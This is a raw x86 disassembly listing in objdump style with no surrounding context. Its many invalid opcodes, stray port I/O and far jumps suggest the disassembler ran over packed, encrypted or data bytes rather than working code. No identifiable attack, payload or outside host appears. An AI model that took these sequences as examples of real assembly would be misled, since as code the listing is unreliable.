  4054b6:	add    BYTE PTR [eax],al
  4054b8:	retf   0xf809
  4054bb:	pushf  
  4054bc:	ins    BYTE PTR es:[edi],dx
  4054bd:	cmp    ah,dl
  4054bf:	aad    0x66
  4054c1:	jle    0x40548a
  4054c3:	add    al,0x5b
  4054c5:	add    BYTE PTR [eax],al
  4054c7:	mov    eax,0x7dcc38
  4054cc:	add    BYTE PTR [esp+eiz*8-0x78534edb],bl
  4054d3:	push   0xffffffa9
  4054d5:	rcl    DWORD PTR ds:[ebx-0x39],0x33
  4054da:	jno    0x4054b7
  4054dc:	mov    al,0x56
  4054de:	dec    edx
  4054df:	(bad)  
  4054e0:	and    eax,edx
  4054e2:	push   esp
  4054e3:	mov    bh,0x36
  4054e5:	dec    edx
  4054e6:	mov    bl,0x3e
  4054e8:	(bad)  
  4054e9:	fcomp  DWORD PTR [eax]
  4054eb:	mov    dh,0x36
  4054ed:	add    esp,edi
  4054ef:	out    0xa9,eax
  4054f1:	(bad)  
  4054f2:	push   ds
  4054f3:	xlat   BYTE PTR ds:[ebx]
  4054f4:	or     ecx,DWORD PTR [eax]
  4054f6:	xchg   esp,eax
  4054f7:	add    BYTE PTR [eax],al
  4054f9:	jb     0x40551e
  4054fb:	into   
  4054fc:	add    al,0x42
  4054fe:	add    BYTE PTR [eax],al
  405500:	daa    
  405501:	jp     0x4054de
  405503:	out    dx,al
  405504:	push   0xffffff95
  405506:	sbb    ecx,DWORD PTR [esi]
  405508:	push   edi
  405509:	push   cs
  40550a:	and    eax,eax
  40550c:	inc    BYTE PTR [eax]
  40550e:	add    BYTE PTR ds:0xc7062aa2,ch
  405514:	pop    ss
  405515:	sbb    al,0x9
  405517:	xor    esp,esp
  405519:	test   eax,0x18794642
  40551e:	sahf   
  40551f:	adc    DWORD PTR [ebx+0x2a9463f2],edi
  405525:	int    0x34
  405527:	mov    ds:0x6a6fbccb,al
  40552c:	jecxz  0x405508
  40552e:	outs   dx,DWORD PTR ds:[esi]
  40552f:	bound  esp,QWORD PTR [esi+ecx*8+0x18]
  405533:	xor    dh,BYTE PTR [ebp-0x5b01c610]
  405539:	stc    
  40553a:	inc    ecx
  40553b:	cmp    dh,BYTE PTR [edi-0x74]
  40553e:	pop    ebx
  40553f:	add    BYTE PTR [eax],al
  405541:	out    dx,al
  405542:	mov    dh,0x90
  405544:	adc    edx,edx
  405546:	mov    eax,ds:0x11059ef6
  40554b:	push   edi
  40554c:	(bad)  [ebx+0x11]
  40554f:	add    eax,0xf30f67f7
  405554:	rep ins DWORD PTR es:[edi],dx
  405556:	push   cs
  405557:	and    bl,BYTE PTR [edx]
  405559:	push   cs
  40555a:	sahf   
  40555b:	inc    edi
  40555c:	sbb    eax,0x6cc8
  405561:	jbe    0x405583
  405563:	scas   eax,DWORD PTR es:[edi]
  405564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405565:	lds    edx,FWORD PTR [esi+ebx*2+0x1]
  405569:	call   0xe575:0xdc97311
  405570:	push   esp
  405571:	call   0xbb0deb84
  405576:	mov    ebx,ebx
  405578:	jmp    0x4055ad
  40557a:	gs leave 
  40557c:	je     0x405534
  40557e:	pop    ecx
  40557f:	imul   ecx,DWORD PTR ds:0x2e12ae23,0xbd9ca1b
  405589:	cmp    eax,0x66f8acf9
  40558e:	in     eax,0x77
  405590:	in     eax,0xb6
  405592:	push   esi
  405593:	sub    eax,DWORD PTR [edx-0x12de7999]
  405599:	nop
  40559a:	dec    ebx
  40559b:	xchg   esp,eax
  40559c:	aad    0x44
  40559e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40559f:	add    BYTE PTR [eax],al
  4055a1:	retf   0x19e5
  4055a4:	mov    bl,0xfa
  4055a6:	and    BYTE PTR [ecx],bh
  4055a8:	in     al,dx
  4055a9:	pusha  
  4055aa:	enter  0x1a,0x0
  4055ae:	mov    cl,0xa2
  4055b0:	jns    0x405630
  4055b2:	dec    edx
  4055b3:	out    dx,al
  4055b4:	push   edi
  4055b5:	adc    edi,DWORD PTR [esi+ebx*1-0x1d]
  4055b9:	pop    esi
  4055ba:	test   al,0x31
  4055bc:	mov    ds:0x56888a,eax
  4055c1:	add    ch,al
  4055c3:	mov    cl,0x74
  4055c5:	sbb    DWORD PTR [ebx-0x6f],esp
  4055c8:	xchg   DWORD PTR [esi+0x3f3cb72],edi
  4055ce:	std    
  4055cf:	fs retf 0x4ee6
  4055d3:	cmp    ecx,eax
  4055d5:	loopne 0x4055d7
  4055d7:	add    BYTE PTR [ecx+0x74378564],dh
  4055dd:	push   ds
  4055de:	cwde   
  4055df:	aad    0x58
  4055e1:	das    
  4055e2:	jle    0x4055c9
  4055e4:	mov    dl,0x9c
  4055e6:	dec    ecx
  4055e7:	ins    BYTE PTR es:[edi],dx
  4055e8:	xchg   esp,eax
  4055e9:	pop    ebx
  4055ea:	xor    ah,BYTE PTR [edx-0x47]
  4055ed:	xchg   al,ah
  4055ef:	pop    ebp
  4055f0:	inc    ebx
  4055f1:	loop   0x405630
  4055f3:	int    0x6a
  4055f5:	imul   edi,ecx,0xffffffeb
  4055f8:	push   esi
  4055f9:	lods   eax,DWORD PTR ds:[esi]
  4055fa:	inc    esp
  4055fb:	pop    esp
  4055fc:	add    BYTE PTR [eax],al
  4055fe:	xchg   edx,eax
  4055ff:	jb     0x405670
  405601:	or     eax,0x30b93de3
  405606:	jno    0x40564a
  405608:	cmp    BYTE PTR [eax+0x5b],cl
  40560b:	add    BYTE PTR [eax],al
  40560d:	add    al,0xfe
  40560f:	add    BYTE PTR [eax],al
  405611:	aaa    
  405612:	xchg   edx,eax
  405613:	ins    DWORD PTR es:[edi],dx
  405614:	add    BYTE PTR [eax+eax*1+0x28df1a00],dl
  40561b:	push   ds
  40561c:	int3   
  40561d:	xor    eax,DWORD PTR [eax]
  40561f:	add    BYTE PTR [edi+ecx*8+0x0],al
  405623:	add    BYTE PTR [ebp-0x551bd160],dl
  405629:	pop    ds
  40562a:	fsub   st,st(5)
  40562c:	pop    ds
  40562d:	cmp    BYTE PTR [edx+0x3d],ch
  405630:	adc    al,0xa9
  405632:	cwde   
  405633:	out    0x39,al
  405635:	jge    0x4055c1
  405637:	rcl    BYTE PTR [esi+esi*1+0x1d],1
  40563b:	sub    ch,bh
  40563d:	dec    ecx
  40563e:	jp     0x405628
  405640:	cmp    al,0x6c
  405642:	idiv   BYTE PTR [ebp+0x4d]
  405645:	aaa    
  405646:	pop    ecx
  405647:	cmp    eax,0x4ee4c6de
  40564c:	pop    ebx
  40564d:	xor    bl,BYTE PTR [ebx]
  40564f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405650:	lea    edi,[esi-0x44]
  405653:	imul   ecx,ecx,0x71279450
  405659:	stos   BYTE PTR es:[edi],al
  40565a:	leave  
  40565b:	push   edx
  40565c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565d:	add    al,0x35
  40565f:	add    BYTE PTR [eax],al
  405661:	pop    es
  405662:	xchg   edx,eax
  405663:	jno    0x405646
  405665:	push   0x3a8ebdbe
  40566a:	stos   BYTE PTR es:[edi],al
  40566b:	ins    DWORD PTR es:[edi],dx
  40566c:	lock jl 0x4055f0
  40566f:	xchg   ch,cl
  405671:	into   
  405672:	test   al,0xb6
  405674:	out    dx,eax
  405675:	or     BYTE PTR [esi+0x0],bh
  405678:	add    BYTE PTR [esp+ebx*2-0x2dd12663],ah
  40567f:	jle    0x40568f
  405681:	ds lock adc eax,0x2f498f9a
  405688:	push   esp
  405689:	aaa    
  40568a:	jo     0x4056e4
  40568c:	mov    ebx,0x2b48
  405691:	push   edx
  405692:	les    ebx,FWORD PTR [eax+0x1a290000]
  405698:	jbe    0x4056a2
  40569a:	or     al,BYTE PTR [eax]
  40569c:	add    BYTE PTR [ebx+eiz*2+0xe],bl
  4056a0:	mov    ss,WORD PTR [ebx]
  4056a2:	add    ch,cl
  4056a4:	loope  0x4056a8
  4056a6:	dec    ecx
  4056a7:	xor    BYTE PTR [edi+0x27030000],0xad
  4056ae:	mov    eax,ds:0x14346755
  4056b3:	fnsave [esi-0x6b078277]
  4056b9:	mov    eax,ds:0xdb3de552
  4056be:	cmp    BYTE PTR [eax],0xe4
  4056c1:	mov    eax,ds:0x388e8317
  4056c6:	add    dl,bh
  4056c8:	test   eax,0xb1fda538
  4056cd:	cmp    DWORD PTR ds:0xfac861,esi
  4056d3:	add    bl,bh
  4056d5:	cli    
  4056d6:	mul    BYTE PTR [ebx+0x4374e9ba]
  4056dc:	inc    ebp
  4056dd:	jge    0x4056d9
  4056df:	sbb    BYTE PTR [edi+0x2],ah
  4056e2:	and    ebx,DWORD PTR [edi-0x746e218b]
  4056e8:	mov    esp,ss
  4056ea:	add    BYTE PTR [eax],al
  4056ec:	ret    
  4056ed:	scas   eax,DWORD PTR es:[edi]
  4056ee:	hlt    
  4056ef:	daa    
  4056f0:	dec    edi
  4056f1:	cmp    al,0x4b
  4056f3:	mov    ebp,edi
  4056f5:	rcr    DWORD PTR [eax+0x5c],1
  4056f8:	sbb    dl,0x0
  4056fb:	add    dh,bh
  4056fd:	nop
  4056fe:	(bad)  
  4056ff:	cmp    DWORD PTR [ecx+0x7cc7185a],ecx
  405705:	mov    edi,0xc7fd94b1
  40570a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40570b:	(bad)  
  40570c:	in     eax,0xba
  40570e:	les    edi,FWORD PTR [esi+0x0]
  405711:	add    BYTE PTR [ebp+0xf],cl
  405714:	aad    0x20
  405716:	lds    edi,FWORD PTR ds:[edi]
  405719:	pop    esp
  40571a:	loopne 0x40570c
  40571c:	jns    0x405785
  40571e:	pop    es
  40571f:	(bad)  
  405720:	xchg   esp,eax
  405721:	push   edi
  405722:	retf   0x548b
  405725:	cmp    eax,0xc830398d
  40572a:	lds    eax,FWORD PTR [eax]
  40572c:	add    BYTE PTR [edi-0x2f9a71a9],bh
  405732:	add    eax,0x6486cbf6
  405737:	out    dx,eax
  405738:	(bad)  
  405739:	int3   
  40573a:	add    BYTE PTR [eax],al
  40573c:	lock add eax,0x83b2b82
  405742:	mov    ds:0xcd100000,eax
  405747:	sbb    edi,esi
  405749:	xchg   BYTE PTR [ecx],cl
  40574b:	mov    WORD PTR [eax+eax*1+0x17632500],cs
  405752:	push   esi
  405753:	jo     0x4056f4
  405755:	lock xor al,0x8
  405758:	and    BYTE PTR [eax],al
  40575a:	add    BYTE PTR [edi+eax*1],dh
  40575d:	out    dx,eax
  40575e:	cmp    ch,BYTE PTR [esi+0x5b]
  405761:	xor    eax,0x12f0e563
  405766:	add    BYTE PTR [ebx+0x0],bl
  405769:	add    BYTE PTR [ebp+0x1ff91a2],al
  40576f:	cmc    
  405770:	lds    esi,FWORD PTR [edi]
  405772:	pop    esi
  405773:	icebp  
  405774:	lock sub DWORD PTR [ebx],eax
  405777:	ror    BYTE PTR [ebp-0x51],cl
  40577a:	pop    ds
  40577b:	leave  
  40577c:	rcr    edi,cl
  40577e:	in     eax,0x84
  405780:	stos   BYTE PTR es:[edi],al
  405781:	add    BYTE PTR [eax],al
  405783:	rcr    BYTE PTR [edi-0x787b0000],0xc3
  40578a:	(bad)  
  40578b:	pusha  
  40578c:	cmc    
  40578d:	jns    0x40573f
  40578f:	add    edx,DWORD PTR [edx]
  405791:	(bad)  
  405792:	test   BYTE PTR [esi+0x0],al
  405795:	add    BYTE PTR [ecx+eiz*4],al
  405798:	add    BYTE PTR [eax],al
  40579a:	rcl    BYTE PTR [ecx+0x0],0x0
  40579e:	out    0x4c,al
  4057a0:	inc    eax
  4057a1:	add    BYTE PTR [eax],al
  4057a3:	jp     0x40574d
  4057a5:	mov    esi,0x71c23a4b
  4057aa:	cwde   
  4057ab:	add    al,dh
  4057ad:	call   0x36ef:0x8fbe16bc
  4057b4:	xchg   esi,eax
  4057b5:	lea    esp,[ebx-0x72]
  4057b8:	(bad)  
  4057b9:	push   0x1e
  4057bb:	stc    
  4057bc:	into   
  4057bd:	lahf   
  4057be:	enter  0x94,0x0
  4057c2:	sub    DWORD PTR [esi],ecx
  4057c4:	add    eax,0xe7523766
  4057c9:	mov    esi,0x4b363a11
  4057ce:	in     al,0xdc
  4057d0:	mov    edx,DWORD PTR [ebp-0x93efc86]
  4057d6:	in     eax,dx
  4057d7:	xor    eax,0x21e4b49c
  4057dc:	cmp    eax,0x4a020327
  4057e1:	jmp    0x8c33ddda
  4057e6:	test   al,0x8e
  4057e8:	icebp  
  4057e9:	addr16 (bad) 
  4057eb:	bswap  ebx
  4057ed:	imul   esi,ebp,0x41
  4057f0:	lods   al,BYTE PTR ds:[esi]
  4057f1:	xchg   esp,eax
  4057f2:	mov    ebp,DWORD PTR [edx-0x59]
  4057f5:	or     dh,BYTE PTR [eax]
  4057f7:	xor    eax,0xe984
  4057fc:	je     0x40579c
  4057fe:	jmp    0xf84a6ec5
  405803:	sub    al,0xd3
  405805:	dec    ebp
  405806:	jnp    0x4057ac
  405808:	sub    ecx,esp
  40580a:	sbb    BYTE PTR [esi+0x1f],0x61
  40580e:	(bad)  
  40580f:	xchg   edx,eax
  405810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405811:	jne    0x405872
  405813:	(bad)  
  405814:	loopne 0x405867
  405816:	mov    ch,0xa3
  405818:	mov    dl,0xfb
  40581a:	inc    edi
  40581b:	(bad)  [edx]
  40581d:	xchg   esi,eax
  40581e:	sar    DWORD PTR [esi],0x36
  405821:	xchg   esp,eax
  405822:	xchg   edx,eax
  405823:	int    0x62
  405825:	and    cl,BYTE PTR [edi-0xa0fcd88]
  40582b:	aam    0xff
  40582d:	adc    ah,BYTE PTR [eax]
  40582f:	cmp    al,0xc9
  405831:	repz dec ebp
  405833:	pop    esp
  405835:	xor    al,BYTE PTR [eax]
  405837:	add    dh,bh
  405839:	dec    edi
  40583a:	jb     0x4057d0
  40583c:	sahf   
  40583d:	out    0x28,eax
  40583f:	add    ebx,DWORD PTR [edi+ebp*2+0x7f1e852e]
  405846:	mov    BYTE PTR [esi],0xf3
  405849:	mul    cl
  40584b:	add    DWORD PTR [esi],ebp
  40584d:	xor    ebp,DWORD PTR [ecx]
  40584f:	outs   dx,DWORD PTR ds:[esi]
  405850:	xchg   ecx,eax
  405851:	leave  
  405852:	push   edx
  405853:	adc    bh,0x0
  405856:	add    BYTE PTR [edx+ecx*8+0x4b002e],dh
  40585d:	add    BYTE PTR [ecx],cl
  40585f:	test   DWORD PTR [ecx],ebp
  405861:	pop    esp
  405862:	popf   
  405863:	or     eax,0x9f9c6f53
  405868:	ja     0x4057f9
  40586a:	jl     0x40588c
  40586c:	inc    esi
  40586d:	js     0x405800
  40586f:	pusha  
  405870:	sub    BYTE PTR [eax-0x529ade51],bl
  405876:	fwait
  405877:	aaa    
  405878:	(bad)  
  405879:	pop    edx
  40587a:	loopne 0x40586a
  40587c:	ds push esi
  40587e:	or     esp,eax
  405880:	pop    ecx
  405881:	outs   dx,BYTE PTR ds:[esi]
  405882:	pushf  
  405883:	xchg   esi,eax
  405884:	scas   eax,DWORD PTR es:[edi]
  405885:	jl     0x4058cf
  405887:	xlat   BYTE PTR ds:[ebx]
  405888:	add    BYTE PTR [eax],al
  40588a:	stos   BYTE PTR es:[edi],al
  40588b:	and    eax,0xe521f5db
  405890:	in     eax,dx
  405891:	and    ah,bh
  405893:	retf   
  405894:	sub    ah,BYTE PTR [ebp-0x2eaf2d6d]
  40589a:	into   
  40589b:	retf   
  40589c:	xchg   edx,eax
  40589d:	or     edx,DWORD PTR [esi-0x4a0cf585]
  4058a3:	pop    ebp
  4058a4:	xor    dh,BYTE PTR [esi+edi*8-0x21d67208]
  4058ab:	iret   
  4058ac:	dec    ebp
  4058ad:	add    al,0x7f
  4058af:	add    BYTE PTR [eax],al
  4058b1:	and    eax,0xf2c4
  4058b6:	in     eax,0x66
  4058b8:	adc    al,0xb1
  4058ba:	mov    bh,0x86
  4058bc:	xor    al,dh
  4058be:	dec    edx
  4058bf:	inc    ecx
  4058c0:	hlt    
  4058c1:	sbb    al,0x4
  4058c3:	xchg   BYTE PTR [eax],al
  4058c5:	add    BYTE PTR [ebx+0x26eab5ad],al
  4058cb:	pop    ds
  4058cc:	dec    si
  4058ce:	repz mov al,ds:0x52fc2075
  4058d4:	mov    al,0x8a
  4058d6:	fcom   DWORD PTR [edi]
  4058d8:	fldcw  WORD PTR [esi]
  4058da:	jbe    0x4058ab
  4058dc:	std    
  4058dd:	add    eax,0xc5a724b6
  4058e2:	dec    edx
  4058e3:	mov    esi,0xac795db6
  4058e8:	sub    ebx,ecx
  4058ea:	jle    0x405871
  4058ec:	mov    ch,BYTE PTR es:[edi]
  4058ef:	fwait
  4058f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f1:	push   ecx
  4058f2:	lea    ebp,[ecx+0x4650e50d]
  4058f8:	jle    0x40595a
  4058fa:	mov    ah,BYTE PTR [esi-0x48]
  4058fd:	jl     0x405975
  4058ff:	ret    0xd27e
  405902:	inc    ecx
  405903:	into   
  405904:	sub    DWORD PTR [edi],eax
  405906:	mov    bh,0x5d
  405908:	ins    DWORD PTR es:[edi],dx
  405909:	fst    st(3)
  40590b:	mov    bl,0xb8
  40590d:	push   esp
  40590e:	ins    DWORD PTR es:[edi],dx
  40590f:	and    ah,bl
  405911:	dec    ecx
  405912:	inc    ecx
  405913:	inc    esp
  405914:	aad    0x0
  405916:	add    BYTE PTR [ecx],bh
  405918:	add    eax,0x93d01a01
  40591d:	jge    0x405973
  40591f:	dec    ebp
  405920:	xchg   ebx,eax
  405921:	mov    ebx,0x9d80ad74
  405926:	add    BYTE PTR [eax],al
  405928:	ds mov dl,0x2e
  40592b:	sahf   
  40592c:	cmp    BYTE PTR [esp+ebx*2+0x76],bl
  405930:	js     0x405919
  405932:	ds test dh,0x6
  405936:	(bad)  
  405937:	dec    ebx
  405938:	clc    
  405939:	mov    esi,0x601c6b75
  40593e:	cmp    DWORD PTR [ebp+0x1c],esi
  405941:	call   0xa4d2:0x742705ca
  405948:	fs push ebx
  40594a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40594b:	stc    
  40594c:	and    ebx,edx
  40594e:	mov    al,ds:0x230f2c7
  405953:	stc    
  405954:	or     cl,dl
  405956:	add    BYTE PTR [eax],al
  405958:	jg     0x405918
  40595a:	mov    edi,edi
  40595c:	or     bl,BYTE PTR [ecx+0x1a]
  40595f:	repz fnstcw WORD PTR [ebx+ebx*4]
  405963:	hlt    
  405964:	dec    edi
  405965:	loop   0x4059dc
  405967:	mov    bl,BYTE PTR [edi+0x3c]
  40596a:	xlat   BYTE PTR ds:[ebx]
  40596b:	mov    ah,0x40
  40596d:	jns    0x40596f
  40596f:	add    al,cl
  405971:	mov    esi,0x53e80000
  405976:	mov    eax,ds:0xfd801acd
  40597b:	add    BYTE PTR [eax],al
  40597d:	jp     0x40593b
  40597f:	adc    BYTE PTR [edi-0x11],bh
  405982:	mov    al,ds:0xa8f0982c
  405987:	sbb    bl,BYTE PTR [edx]
  405989:	ja     0x4059e1
  40598b:	aad    0x8d
  40598d:	sti    
  40598e:	mov    ds:0xa34f8dbe,al
  405993:	xlat   BYTE PTR ds:[ebx]
  405994:	mov    bh,0xe9
  405996:	int3   
  405997:	xor    al,0x0
  405999:	add    BYTE PTR [eax+0x73],ch
  40599c:	out    dx,al
  40599d:	int3   
  40599e:	jmp    0x4059a0
  4059a0:	add    BYTE PTR [ebp+0x70a3537f],dh
  4059a6:	jg     0x4059ef
  4059a8:	mov    ds:0xcc8c,eax
  4059ad:	call   0x5aaf:0x3dc8
  4059b4:	sbb    eax,0x8d3554cf
  4059b9:	adc    esp,DWORD PTR [ecx-0x61987239]
  4059bf:	fcom   st(0)
  4059c1:	jno    0x40597a
  4059c3:	lock mov WORD PTR [eax+0x0],gs
  4059c7:	add    BYTE PTR [ecx],dh
  4059c9:	aam    0x55
  4059cb:	cmp    bl,BYTE PTR [edx+eiz*4+0x65]
  4059cf:	imul   ebx,DWORD PTR [eax],0x9f78fe5f
  4059d5:	ds inc esp
  4059d7:	test   BYTE PTR [eax],0x0
  4059da:	mov    ch,0x9f
  4059dc:	out    dx,al
  4059dd:	in     eax,0x6c
  4059df:	push   0x5d530b6
  4059e4:	jge    0x405a63
  4059e6:	clc    
  4059e7:	mov    dh,0xb1
  4059e9:	cmp    BYTE PTR [edi-0x2e710000],0x48
  4059f0:	add    BYTE PTR [eax],0x0
  4059f3:	stos   BYTE PTR es:[edi],al
  4059f4:	div    cl
  4059f6:	(bad)  
  4059f8:	bnd jg 0x405a33
  4059fb:	mov    DWORD PTR [esi+0x702270d4],edi
  405a01:	retf   0xde37
  405a04:	or     DWORD PTR [eax+0x1a],esp
  405a07:	sbb    eax,0xde3a8ba
  405a0c:	ror    BYTE PTR [edi-0x7d60000],0xfe
  405a13:	repz (bad) 
  405a15:	jo     0x4059ac
  405a17:	mov    ebx,0x71c7ef22
  405a1c:	mov    DWORD PTR [ebp+0xfc44ff],esp
  405a22:	add    BYTE PTR [edi+0x3c],cl
  405a25:	dec    ebx
  405a26:	and    ch,BYTE PTR [eax]
  405a28:	int    0x20
  405a2a:	jg     0x405a2f
  405a2c:	int    0xa
  405a2e:	sub    DWORD PTR [ecx],edi
  405a30:	mov    DWORD PTR [ebx-0x9852fe2],eax
  405a36:	lock ror DWORD PTR gs:[esi+0x77],1
  405a3b:	cmp    eax,0x6b2d5de0
  405a40:	sbb    cl,BYTE PTR [ebx]
  405a42:	lock dec ebx
  405a45:	ror    BYTE PTR [eax],cl
  405a47:	dec    esi
  405a48:	add    BYTE PTR [eax],al
  405a4a:	inc    esi
  405a4b:	add    dh,BYTE PTR [ecx+eiz*1]
  405a4e:	mov    ch,0x7c
  405a50:	out    dx,al
  405a51:	xchg   esi,eax
  405a52:	jle    0x405a1e
  405a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a55:	fwait
  405a56:	jmp    0x762b:0x75940f12
  405a5d:	mov    dh,0x78
  405a5f:	push   esi
  405a60:	dec    edx
  405a61:	frstor [eax]
  405a63:	jl     0x405ab2
  405a65:	push   edx
  405a67:	je     0x405ac7
  405a69:	hlt    
  405a6a:	in     al,0xe2
  405a6c:	rcr    ebp,1
  405a6e:	or     eax,0x9bf496b9
  405a73:	mov    ds:0x77993643,eax
  405a78:	call   0x0:0xac0766e
  405a7f:	ror    esi,1
  405a81:	fstp   TBYTE PTR [edx+0x3e]
  405a84:	add    bl,BYTE PTR [edi+0x70]
  405a87:	cli    
  405a88:	dec    esi
  405a89:	imul   edx,DWORD PTR [eax+esi*2],0xfffffff1
  405a8d:	int    0xa6
  405a8f:	loopne 0x405a81
  405a91:	int3   
  405a92:	das    
  405a93:	add    BYTE PTR [eax],al
  405a95:	mov    al,0xfa
  405a97:	das    
  405a98:	fidiv  DWORD PTR [edi+edx*1]
  405a9b:	push   es
  405a9c:	cld    
  405a9d:	jmp    0x405a25
  405a9f:	mov    ebx,0xfb9d53d6
  405aa4:	and    dl,BYTE PTR [esi+0x3c]
  405aa7:	repz out dx,eax
  405aa9:	dec    edi
  405aaa:	mov    esi,0x6c3c2d38
  405aaf:	sar    ecx,0xfe
  405ab2:	pop    ecx
  405ab3:	lahf   
  405ab4:	mov    edi,0x80c158ac
  405ab9:	in     al,dx
  405aba:	add    BYTE PTR [eax],al
  405abc:	daa    
  405abd:	aas    
  405abe:	adc    dl,BYTE PTR [edx]
  405ac0:	jmp    DWORD PTR [ebx+ebp*1-0x69]
  405ac4:	and    esi,DWORD PTR [edi]
  405ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac7:	scas   eax,DWORD PTR es:[edi]
  405ac8:	jne    0x405a5c
  405aca:	or     eax,0x925851bb
  405acf:	(bad)  
  405ad0:	sub    DWORD PTR [edx-0x42],ebp
  405ad3:	sbb    BYTE PTR [ecx+edi*2],bh
  405ad6:	cli    
  405ad7:	jae    0x405b11
  405ad9:	mov    esp,0xfee71296
  405ade:	retf   
  405adf:	dec    ecx
  405ae0:	pop    edi
  405ae1:	pop    edx
  405ae2:	xchg   edi,eax
  405ae3:	(bad)  
  405ae4:	rol    BYTE PTR [eax],cl
  405ae6:	add    BYTE PTR [esi+0x76],dl
  405ae9:	dec    ecx
  405aea:	cwde   
  405aeb:	pop    eax
  405aec:	and    esi,ecx
  405aee:	xchg   ecx,ebp
  405af0:	dec    ebx
  405af1:	ss jge 0x405b64
  405af4:	cdq    
  405af5:	stc    
  405af6:	push   ecx
  405af7:	mov    ah,0xb
  405af9:	popa   
  405afa:	sub    al,0x4d
  405afc:	mov    DWORD PTR [ecx+ecx*2-0x4e],esi
  405b00:	jge    0x405b15
  405b02:	xchg   ebx,eax
  405b03:	mov    dh,0xe5
  405b05:	sar    BYTE PTR [edx],1
  405b07:	pop    esi
  405b08:	jne    0x405abf
  405b0a:	mov    cl,0xe6
  405b0c:	pop    ebp
  405b0d:	add    bl,BYTE PTR [edi+0x56f246d6]
  405b13:	aas    
  405b14:	data16 jbe 0x405ae5
  405b17:	cmp    ch,BYTE PTR [ebx-0x6d84ee18]
  405b1d:	(bad)  
  405b1e:	xchg   edi,eax
  405b1f:	mov    dl,0x3d
  405b21:	outs   dx,DWORD PTR ds:[esi]
  405b22:	outs   dx,DWORD PTR ds:[esi]
  405b23:	mov    edi,0xb716a479
  405b28:	jae    0x405b22
  405b2a:	mov    ah,0xc5
  405b2c:	cmc    
  405b2d:	ins    BYTE PTR es:[edi],dx
  405b2e:	loopne 0x405b7d
  405b30:	out    dx,al
  405b31:	test   BYTE PTR [edi],0x45
  405b34:	lahf   
  405b35:	cmp    esi,DWORD PTR [edi]
  405b37:	fs and eax,0x72f69c8d
  405b3d:	pop    es
  405b3e:	push   ds
  405b3f:	mov    ch,dl
  405b41:	push   0x1f887823
  405b46:	add    BYTE PTR [eax],al
  405b48:	mov    bh,0xdc
  405b4a:	aas    
  405b4b:	pop    edi
  405b4c:	adc    esp,DWORD PTR [di+0x3009]
  405b51:	inc    eax
  405b52:	inc    BYTE PTR [eax]
  405b54:	add    BYTE PTR [edi-0x737103a2],bh
  405b5a:	mov    dh,0x0
  405b5c:	add    BYTE PTR [ecx-0x37b51e1c],dh
  405b62:	xor    BYTE PTR [eax],al
  405b64:	add    ch,bh
  405b66:	(bad)  
  405b67:	jb     0x405be0
  405b69:	in     al,dx
  405b6a:	jno    0x405b8d
  405b6c:	mov    gs:0x38c13fc7,al
  405b72:	xor    BYTE PTR [ebp+0x20d3ba5c],dh
  405b78:	xchg   edx,eax
  405b79:	cs dec ecx
  405b7b:	stc    
  405b7c:	and    ebx,esi
  405b7e:	dec    BYTE PTR [ebp+0x1c8012]
  405b84:	add    BYTE PTR [eax-0x19],ch
  405b87:	cmp    edi,DWORD PTR [edx+0x7a24ebd9]
  405b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b8e:	(bad)  
  405b8f:	jmp    0x405b91
  405b91:	add    BYTE PTR [ecx+0x2fb777d5],dl
  405b97:	add    ch,BYTE PTR [ebp+0x297ca578]
  405b9d:	sbb    al,0x1a
  405b9f:	mov    al,0x81
  405ba1:	sbb    BYTE PTR [edi+0x1b6b2437],cl
  405ba7:	sub    BYTE PTR [ebp-0x15],0xe6
  405bab:	lahf   
  405bac:	dec    ebp
  405bad:	(bad)  
  405bae:	std    
  405baf:	add    al,0xb
  405bb1:	add    BYTE PTR [eax],al
  405bb3:	push   0xffffffa0
  405bb5:	xor    eax,0xead7cdbd
  405bba:	gs mov ecx,0x648
  405bc0:	mov    ch,0x96
  405bc2:	js     0x405b72
  405bc4:	add    esp,ebp
  405bc6:	icebp  
  405bc7:	lds    edi,FWORD PTR [esi+0x61eb47ac]
  405bcd:	pusha  
  405bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bcf:	lds    edi,FWORD PTR [ebx]
  405bd1:	clc    
  405bd2:	mov    esi,ss
  405bd4:	add    BYTE PTR [eax],al
  405bd6:	lds    eax,FWORD PTR [ecx-0x30]
  405bd9:	xchg   ebp,eax
  405bdb:	jmp    0x405c49
  405bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bde:	(bad)
  405be1:	inc    eax
  405be2:	outs   dx,DWORD PTR ds:[esi]
  405be3:	add    BYTE PTR [eax],al
  405be5:	jnp    0x405c37
  405be7:	mov    esp,ebx
  405be9:	loopne 0x405ba8
  405beb:	inc    DWORD PTR [esi+0x13076b62]
  405bf1:	add    esi,0xffffffef
  405bf4:	aad    0xaf
  405bf6:	jle    0x405c67
  405bf8:	mov    ecx,0xcce7ab39
  405bfd:	pop    ecx
  405bfe:	add    BYTE PTR [eax],al
  405c00:	repnz dec esp
  405c02:	sbb    DWORD PTR [eax],eax
  405c04:	add    BYTE PTR [ebx+0x3200],bh
  405c0a:	mov    al,ds:0x71bacf3e
  405c0f:	scas   al,BYTE PTR es:[edi]
  405c10:	fild   WORD PTR [ecx-0x48]
  405c13:	sti    
  405c14:	mov    ah,BYTE PTR [edi+0x27]
  405c17:	and    dl,dh
  405c19:	xlat   BYTE PTR ds:[ebx]
  405c1a:	dec    ebp
  405c1b:	sahf   
  405c1c:	mov    bh,0xf7
  405c1e:	lock cmp ebp,DWORD PTR [esp+edi*8+0x555ee11c]
  405c26:	repnz stos DWORD PTR es:[edi],eax
  405c28:	sahf   
  405c29:	cmp    edi,DWORD PTR [edi]
  405c2b:	stc    
  405c2c:	mov    WORD PTR ds:0xad0e0000,ss
  405c32:	xchg   ebp,eax
  405c33:	shr    cl,cl
  405c35:	push   cs
  405c36:	pop    eax
  405c37:	and    eax,0x3b37b2fe
  405c3c:	jg     0x405bf2
